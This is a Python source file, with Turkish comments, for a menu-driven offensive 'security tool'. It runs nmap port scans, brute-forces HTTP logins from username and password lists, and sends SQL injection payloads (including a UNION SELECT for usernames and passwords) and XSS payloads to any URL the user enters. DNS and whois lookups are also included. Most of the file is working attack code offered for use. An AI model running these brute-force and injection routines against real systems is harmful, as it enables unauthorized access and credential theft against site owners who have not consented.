import socket
import threading
import nmap
import requests
import dns.resolver
import whois


class SecurityTool:
    def __init__(self):
        self.target_ip = None
        self.target_domain = None
        self.ascii_art = r"""
 .--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..      
/ .. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \
\ \/\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ \/ /
 \/ /`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'\/ / 
 / /\                                                                            / /\ 
/ /\ \       ___           ___           ___           ___           ___        / /\ \
\ \/ /      /\__\         /\__\         /\  \         /\  \         /\  \       \ \/ /
 \/ /      /::|  |       /:/ _/_       /::\  \       /::\  \       /::\  \       \/ / 
 / /\     /:/:|  |      /:/ /\__\     /:/\:\__\     /:/\:\  \     /:/\:\__\      / /\ 
/ /\ \   /:/|:|  |__   /:/ /:/ _/_   /:/ /:/  /    /:/  \:\  \   /:/ /:/  /     / /\ \
\ \/ /  /:/ |:| /\__\ /:/_/:/ /\__\ /:/_/:/__/___ /:/__/ \:\__\ /:/_/:/__/___   \ \/ /
 \/ /   \/__|:|/:/  / \:\/:/ /:/  / \:\/:::::/  / \:\  \ /:/  / \:\/:::::/  /    \/ /
 / /\       |:/:/  /   \::/_/:/  /   \::/~~/~~~~   \:\  /:/  /   \::/~~/~~~~     / /\ 
/ /\ \      |::/  /     \:\/:/  /     \:\~~\        \:\/:/  /     \:\~~\        / /\ \
\ \/ /      |:/  /       \::/  /       \:\__\        \::/  /       \:\__\       \ \/ /
 \/ /       |/__/         \/__/         \/__/         \/__/         \/__/        \/ / 
 / /\        ___           ___                                                   / /\ 
/ /\ \      /\  \         /\  \                                                 / /\ \
\ \/ /     /::\  \       /::\  \         ___                                    \ \/ /
 \/ /     /:/\:\  \     /:/\:\  \       /\__\                                    \/ /
 / /\    /:/  \:\  \   /:/  \:\  \     /:/  /                                    / /\ 
/ /\ \  /:/__/ \:\__\ /:/__/ \:\__\   /:/__/                                    / /\ \
\ \/ /  \:\  \ /:/  / \:\  \ /:/  /  /::\  \                                    \ \/ /
 \/ /    \:\  /:/  /   \:\  /:/  /  /:/\:\  \                                    \/ /
 / /\     \:\/:/  /     \:\/:/  /   \/__\:\  \                                   / /\ 
/ /\ \     \::/  /       \::/  /         \:\__\                                 / /\ \
\ \/ /      \/__/         \/__/           \/__/                                 \ \/ /
 \/ /                                                                            \/ / 
 / /\.--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ 
/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \
\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `"\ `'\ `'\ `'\ `'\ `' /
 `--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`-- 
   .--.       .--.
    _  `    \     /    `  _
     `\.===. \.^./ .===./`
            \/`"`\/
         ,  |cybmr|  ,
        / `\|;-.-'|/` \
       /    |::\  |    \
    .-' ,-'`|:::; |`'-, '-.
        |   |::::\|   | 
        |   |::::;|   |
        |   \:::://   |
        |    `.://'   |
       .'             `.
    _,'                 `,_    
        """
    
    def show_ascii_art(self):
        # ASCII sanatini ekrana yazdir
        print(self.ascii_art)

    # 1. IP Bulma (Domain'den IP almak)
    def get_ip_from_domain(self, domain):
        try:
            ip = socket.gethostbyname(domain)
            print(f"{domain} IP adresi: {ip}")
            return ip
        except socket.gaierror:
            print(f"{domain} için IP alinamadi.")
            return None

    # 2. DNS Lookup
    def dns_lookup(self, domain):
        try:
            # Protokol kısmını temizle
            domain = domain.split("//")[-1]
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(domain)
            print(f"{domain} DNS kayitlari:")
            for rdata in answers:
                print(f"IP: {rdata.address}")
        except Exception as e:
            print(f"DNS lookup hatasi: {e}")

    # 3. Whois Lookup
    def whois_lookup(self, domain):
        try:
            w = whois.whois(domain)
            print(f"{domain} Whois Bilgileri:")
            print(w)
        except Exception as e:
            print(f"Whois sorgusu hatasi: {e}")

    def set_target(self, target):
        if target.startswith("http"):
            self.target_domain = target
            self.target_ip = self.get_ip_from_domain(target.split('//')[1])
        else:
            self.target_ip = target
        print(f"Hedef IP: {self.target_ip}")

    # 4. Port Tarama
    def port_scan(self, target_ip, port_range="22-443"):
        print(f"Port taramasi başlatiliyor: {target_ip}")
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments=f"-p {port_range}")
        for host in nm.all_hosts():
            print(f"Tarama Sonuçlari: {host}")
            for protocol in nm[host].all_protocols():
                print(f"Protokol: {protocol}")
                lport = nm[host][protocol].keys()
                for port in lport:
                    print(f"Port: {port} | Durum: {nm[host][protocol][port]['state']}")

    # 5. Brute Force Saldirisi
    def start_brute_force(self, url, username_file=None, password_file=None, usernames=None, passwords=None):
        print("Brute Force saldirisi başlatiliyor...")

        # Eğer dosya yolu verilmişse, dosyalari oku
        if username_file and password_file:
            with open(username_file, 'r') as u_file:
                usernames = u_file.readlines()
            with open(password_file, 'r') as p_file:
                passwords = p_file.readlines()

        # Eğer manuel giriş yapiliyorsa, girilen kullanici adi ve şifreleri listeye çevir
        if usernames and passwords:
            usernames = usernames.split(',')
            passwords = passwords.split(',')

        # Brute force saldirisini gerçekleştir
        for username in usernames:
            for password in passwords:
                print(f"Deneme: {username.strip()} - {password.strip()}")
                # Burada gerçek brute force saldirisini yapacak kodu eklemeniz gerekecek
                # Örneğin, HTTP istekleri veya POST verisi gönderme ile login denemeleri
                response = requests.post(url, data={'username': username.strip(), 'password': password.strip()})
                if "başarili giriş" in response.text:
                    print(f"Başarili giriş: {username.strip()} - {password.strip()}")
                    return
        print("Brute Force saldirisi tamamlandi.")

    # 6. SQL Injection Testi
    def sql_injection(self, url):
        print("SQL Injection testi başlatiliyor...")

        # Burada SQL Injection için yaygin parametreleri test ediyoruz
        payloads = ["' OR '1'='1", "' OR 'x'='x", "' UNION SELECT NULL, username, password FROM users --"]
        for payload in payloads:
            print(f"Deneme: {payload}")
            response = requests.get(url, params={'id': payload})
            if "veri tabani hatasi" in response.text or "sistemde hata" in response.text:
                print(f"SQL Injection başarili: {payload}")
                return
        print("SQL Injection testi tamamlandi.")

    # 7. XSS Testi
    def xss_test(self, url):
        print("XSS testi başlatiliyor...")

        # Burada XSS saldirisi için yaygin script payloadlarini test ediyoruz
        payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">']
        for payload in payloads:
            print(f"Deneme: {payload}")
            response = requests.get(url, params={'input': payload})
            if payload in response.text:
                print(f"XSS saldirisi başarili: {payload}")
                return
        print("XSS testi tamamlandi.")

    def display_menu(self):
        print("\n----- Güvenlik Araçlari -----")
        print("1. Port Taramasi")
        print("2. Brute Force Saldirisi")
        print("3. SQL Injection Testi")
        print("4. XSS Testi")
        print("5. DNS Lookup")
        print("6. Whois Lookup")
        print("7. Çikiş")
        choice = input("Seçiminizi yapin: ")
        return choice

    def run(self):
        # Program başlatıldığında ASCII sanatı göster
        self.show_ascii_art()

        while True:
            choice = self.display_menu()
            if choice == "1":
                self.port_scan(self.target_ip)
            elif choice == "2":
                url = input("Brute Force saldirisi için URL girin: ")
                input_method = input("Dosyadan mi yoksa manuel mi giriş yapacaksiniz? (dosya/manuel): ")
                if input_method == "dosya":
                    username_file = input("Kullanici adi dosyasinin yolunu girin: ")
                    password_file = input("Şifre listesi dosyasinin yolunu girin: ")
                    self.start_brute_force(url, username_file=username_file, password_file=password_file)
                elif input_method == "manuel":
                    usernames = input("Kullanici adlarini virgülle ayirarak girin: ")
                    passwords = input("Şifreleri virgülle ayirarak girin: ")
                    self.start_brute_force(url, usernames=usernames, passwords=passwords)
            elif choice == "3":
                url = input("SQL Injection testini yapacağınız URL'yi girin: ")
                self.sql_injection(url)
            elif choice == "4":
                url = input("XSS testini yapacağınız URL'yi girin: ")
                self.xss_test(url)
            elif choice == "5":
                domain = input("DNS sorgulaması yapacağınız domain'i girin: ")
                self.dns_lookup(domain)
            elif choice == "6":
                domain = input("Whois sorgulaması yapacağınız domain'i girin: ")
                self.whois_lookup(domain)
            elif choice == "7":
                print("Çıkılıyor...")
                break
            else:
                print("Geçersiz seçim! Tekrar deneyin.")

# Uygulama başlatma
if __name__ == "__main__":
    tool = SecurityTool()
    tool.run()